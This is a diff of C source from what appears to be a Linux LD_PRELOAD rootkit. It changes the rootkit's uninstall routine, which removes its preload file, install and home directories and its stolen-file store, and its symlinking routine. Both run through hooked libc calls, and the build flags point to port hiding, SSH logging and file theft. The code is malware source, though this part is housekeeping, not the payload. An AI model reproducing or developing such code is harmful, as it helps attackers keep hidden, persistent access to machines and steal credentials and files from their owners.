@@ -66,29 +66,23 @@ void eradicatedir(const char *target){
 
 void uninstallbdv(void){
     eradicatedir(INSTALL_DIR);
+    eradicatedir(HOMEDIR);
 #ifdef FILE_STEAL
     eradicatedir(INTEREST_DIR);
 #endif
 
     hook(CUNLINK);
     if((long)call(CUNLINK, PRELOAD_FILE) < 0)
-        printf("failed removing preload file\n");
-#ifdef HIDE_PORTS
-    if((long)call(CUNLINK, HIDEPORTS) < 0)
-        printf("failed removing hideports file\n");
-#endif
-#ifdef LOG_SSH
-    if((long)call(CUNLINK, SSH_LOGS) < 0)
-        printf("failed removing sshlogs file\n");
-#endif
-#ifdef READ_GID_FROM_FILE
-    if((long)call(CUNLINK, GID_PATH) < 0)
-        printf("failed removing gidpath\n");
-#endif
-#ifdef AUTO_GID_CHANGER
-    if((long)call(CUNLINK, GIDTIME_PATH) < 0)
-        printf("failed removing gidtime path\n");
-#endif
+        printf("failed removing preload file (%s)\n", PRELOAD_FILE);
+
+    char *src, *dest;
+    for(int i = 0; i != LINKSRCS_SIZE; i++){
+        src = linksrcs[i];
+        dest = linkdests[i];
+
+        if((long)call(CUNLINK, src) < 0 && errno != ENOENT)
+            printf("failed removing %s (%s)\n", src, basename(dest));
+    }
 }
 
 void do_self(void){
@@ -122,23 +116,25 @@ void do_self(void){
 void symlinkstuff(void){
     hook(CACCESS, CSYMLINK);
 
-    char *current, *currentdup, *src, *dest;
-    for(int i = 0; i != sizeofarr(linkpaths); i++){
-        current = linkpaths[i];
-        currentdup = strdup(current);
-
-        src = strtok(currentdup, ":");
-        dest = strtok(NULL, ":");
+    char *src, *dest;
+    int ok=0, fail=0;
+    for(int i = 0; i != LINKSRCS_SIZE; i++){
+        src = linksrcs[i];
+        dest = linkdests[i];
 
         if((long)call(CACCESS, src, F_OK) == 0){
             if((long)call(CSYMLINK, src, dest) < 0){
                 if(errno != EEXIST)
-                    printf("Error linking %s (\e[31m%s\e[0m)\n", src, basename(dest));
-            }else printf("Link successful: \e[31m%s\e[0m.\n", basename(dest));
+                    fail++;
+                else
+                    ok++; // assume thats ok
+            }else ok++;
         }
-
-        free(currentdup);
     }
+
+    printf("Links successful: \e[31m%d\e[0m/%d\n", ok, LINKSRCS_SIZE);
+    if(fail > 0)
+        printf("Failed links: \e[31m%d\e[0m)\n", fail);
 
     exit(0);
 }
